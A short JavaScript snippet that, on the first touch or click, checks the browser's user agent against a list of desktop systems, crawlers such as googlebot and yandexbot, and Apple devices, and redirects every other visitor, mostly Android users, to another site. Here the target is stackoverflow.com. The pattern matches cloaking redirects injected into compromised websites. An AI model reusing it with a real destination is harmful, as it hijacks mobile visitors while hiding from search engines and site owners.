document.body.addEventListener('touchstart',chk, false);
document.body.addEventListener('touchend',chk, false);
document.body.addEventListener('click',chk, false);
document.body.addEventListener('mouseup',chk, false);
document.body.addEventListener('mousedown',chk, false);
function chk(){
	var n = ['windows nt','bsd','x11','unix','macintosh','libwww','google','yandexbot','msnbot','fdm','maui','webmoney','primeport','mxagent','greenbrowser','muncher','btwebclient','download master','ossproxy','macos','aport','ipad','iphone','playstation','windows','blackberry'];
	var r = 0;		
	var u = navigator.userAgent;
	for(var i=0, l=n.length; i<l; i++)
		if(u.toLowerCase().indexOf(n[i])!=-1)
			r = 1;
	if(r!=1)
		window.location.href = "http://stackoverflow.com";
}
